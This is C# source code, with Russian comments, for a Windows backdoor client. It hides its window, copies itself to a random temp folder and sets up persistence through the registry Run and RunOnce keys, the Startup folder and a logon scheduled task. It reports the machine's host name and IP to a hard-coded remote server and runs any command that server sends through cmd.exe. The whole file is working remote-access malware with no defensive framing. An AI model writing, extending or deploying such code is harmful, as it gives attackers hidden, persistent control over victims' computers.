using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;

class Client
{
    public static void Main()
    {
        HideConsoleWindow();

        // Путь к текущему исполнимому файлу
        string exePath = Process.GetCurrentProcess().MainModule.FileName;

        // Копирование файла в случайное место
        string randomFolderPath = CopyFileToRandomLocation(exePath);

        // Добавление в автозагрузку
        AddToRegistryRun(randomFolderPath);
        AddToRegistryRunOnce(randomFolderPath);
        AddToStartupFolder(randomFolderPath);
        AddToTaskScheduler(randomFolderPath);

        string clientInfo = GetClientInfo();
        TcpClient client = new TcpClient("193.58.121.250", 7174);
        NetworkStream stream = client.GetStream();

        byte[] clientInfoBytes = Encoding.UTF8.GetBytes(clientInfo);
        stream.Write(clientInfoBytes, 0, clientInfoBytes.Length);

        new Thread(() => ListenForCommands(stream)).Start();

        // Отправка данных на сервер
        while (true)
        {
            byte[] data = Encoding.UTF8.GetBytes("1");
            stream.Write(data, 0, data.Length);
            Thread.Sleep(30000);
        }
    }

    // Метод для скрытия консольного окна
    private static void HideConsoleWindow()
    {
        var handle = Process.GetCurrentProcess().MainWindowHandle;
        ShowWindow(handle, 0); // 0 - скрывает окно
    }

    // Внешний метод для вызова ShowWindow
    [DllImport("user32.dll")]
    private static extern int ShowWindow(IntPtr hWnd, uint Msg);

    // Метод для копирования файла в случайное место
    private static string CopyFileToRandomLocation(string sourceFilePath)
    {
        try
        {
            string tempFolder = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            string randomFilePath = Path.Combine(tempFolder, Path.GetFileName(sourceFilePath));

            // Создаем директорию
            Directory.CreateDirectory(tempFolder);

            // Копируем файл в случайную директорию
            File.Copy(sourceFilePath, randomFilePath);

            Console.WriteLine("[+] Файл скопирован в случайную директорию: " + randomFilePath);
            return randomFilePath;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при копировании файла: " + ex.Message);
            return string.Empty;
        }
    }

    // Добавление в реестр Run
    private static void AddToRegistryRun(string exePath)
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            if (key != null)
            {
                key.SetValue("MyClientApp", exePath);  // Имя программы в реестре
                key.Close();
                Console.WriteLine("[+] Добавлено в автозагрузку (Run).");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при добавлении в Run реестр: " + ex.Message);
        }
    }

    // Добавление в реестр RunOnce
    private static void AddToRegistryRunOnce(string exePath)
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true);

            if (key != null)
            {
                key.SetValue("MyClientAppOnce", exePath);  // Имя программы в реестре
                key.Close();
                Console.WriteLine("[+] Добавлено в автозагрузку (RunOnce).");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при добавлении в RunOnce реестр: " + ex.Message);
        }
    }

    // Добавление в папку автозагрузки
    private static void AddToStartupFolder(string exePath)
    {
        try
        {
            string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup");

            // Копирование файла в папку автозагрузки
            string fileName = Path.GetFileName(exePath);
            string destinationPath = Path.Combine(startupFolder, fileName);
            File.Copy(exePath, destinationPath, true);
            Console.WriteLine("[+] Добавлено в папку автозагрузки.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при добавлении в папку автозагрузки: " + ex.Message);
        }
    }

    // Добавление задачи в планировщик задач
    private static void AddToTaskScheduler(string exePath)
    {
        try
        {
            string taskName = "MyClientAppTask_" + DateTime.Now.Ticks;

            // Создание задачи через schtasks
            ProcessStartInfo startInfo = new ProcessStartInfo("schtasks.exe")
            {
                Arguments = $"/create /tn \"{taskName}\" /tr \"{exePath}\" /sc onlogon /f",
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(startInfo);
            Console.WriteLine("[+] Задача добавлена в Планировщик задач.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при добавлении в Планировщик задач: " + ex.Message);
        }
    }

    // Получение информации о клиенте
    private static string GetClientInfo()
    {
        string hostName = Dns.GetHostName();
        string ipAddress = "";

        foreach (var address in Dns.GetHostEntry(hostName).AddressList)
        {
            if (address.AddressFamily == AddressFamily.InterNetwork)
            {
                ipAddress = address.ToString();
                break;
            }
        }

        return $"{ipAddress}_{hostName}";
    }

    // Получение публичного IP (синхронно)
    private static string GetPublicIp()
    {
        using (WebClient client = new WebClient())
        {
            try
            {
                return client.DownloadString("https://api.ipify.org");
            }
            catch
            {
                return "Unknown";
            }
        }
    }

    // Прослушивание команд от сервера
    private static void ListenForCommands(NetworkStream stream)
    {
        byte[] buffer = new byte[1024];

        while (true)
        {
            try
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    ExecuteCommand(command);
                }
            }
            catch
            {
                break;
            }
        }
    }

    // Выполнение команды
    private static void ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }
        catch (Exception)
        {
            // Ошибка выполнения команды
        }
    }
}
